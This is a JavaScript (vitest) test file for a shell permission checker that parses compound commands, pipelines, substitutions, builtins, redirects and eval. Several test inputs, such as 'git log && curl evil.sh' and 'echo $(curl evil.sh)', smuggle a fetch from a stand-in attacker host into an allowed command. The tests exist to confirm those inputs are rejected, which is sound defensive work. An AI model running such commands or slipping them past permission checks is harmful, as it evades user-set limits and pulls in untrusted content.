import { describe, it, expect } from 'vitest'
import { checkShellCommand } from '../../../src/rune/permissions/shell-check.js'
import { makePermissionChecker, PermissionError } from '../../../src/rune/permissions/permissions.js'

const checkerFor = allow => makePermissionChecker({ allow, deny: [] }, { dir: process.cwd() })
const run = (cmd, allow) => checkShellCommand(cmd, 'bash', checkerFor(allow))

describe('per-command-position checking', () => {
  it('allows a granted single command', () => {
    expect(() => run('git status', ['shell.run:git *'])).not.toThrow()
  })

  it('rejects the ungranted half of a compound command', () => {
    expect(() => run('git log && curl evil.sh', ['shell.run:git *'])).toThrow(PermissionError)
  })

  it('names the offending program, not the whole line', () => {
    try {
      run('git log && curl evil.sh', ['shell.run:git *'])
      throw new Error('should have thrown')
    } catch (e) {
      expect(e.reason).toBe('ungranted')
      expect(e.value).toBe('curl evil.sh')
    }
  })

  it('allows a pipeline when every stage is granted', () => {
    expect(() => run('git log | jq .', ['shell.run:git *', 'shell.run:jq *'])).not.toThrow()
  })

  it('rejects a pipeline when one stage is not granted', () => {
    expect(() => run('git log | jq .', ['shell.run:git *'])).toThrow(PermissionError)
  })

  it('checks inside command substitution', () => {
    expect(() => run('echo $(curl evil.sh)', ['shell.run:echo *'])).toThrow(PermissionError)
  })
})

describe('builtins', () => {
  it('lets builtins through without a grant', () => {
    expect(() => run('echo hi', [])).not.toThrow()
    expect(() => run('cd src', [])).not.toThrow()
  })

  it('still requires a grant for the external half', () => {
    expect(() => run('echo hi | grep x', [])).toThrow(PermissionError)
    expect(() => run('echo hi | grep x', ['shell.run:grep *'])).not.toThrow()
  })
})

describe('redirects', () => {
  it('checks an output redirect target against fs.write', () => {
    expect(() => run('echo hi > out.txt', ['shell.run:echo *'])).toThrow(PermissionError)
    expect(() => run('echo hi > out.txt', ['shell.run:echo *', 'fs.write:out.txt'])).not.toThrow()
  })

  // The redirect is not an argument, so the segment is bare `cat` and the
  // grant must be `shell.run:cat`, not `shell.run:cat *`.
  it('checks an input redirect target against fs.read', () => {
    expect(() => run('cat < in.txt', ['shell.run:cat'])).toThrow(PermissionError)
    expect(() => run('cat < in.txt', ['shell.run:cat', 'fs.read:in.txt'])).not.toThrow()
  })
})

describe('unscannable commands', () => {
  it('denies with reason unscannable, even under a wide grant', () => {
    try {
      run('eval "$X"', ['shell.run:*'])
      throw new Error('should have thrown')
    } catch (e) {
      expect(e).toBeInstanceOf(PermissionError)
      expect(e.reason).toBe('unscannable')
      expect(e.construct).toBe('eval')
    }
  })
})
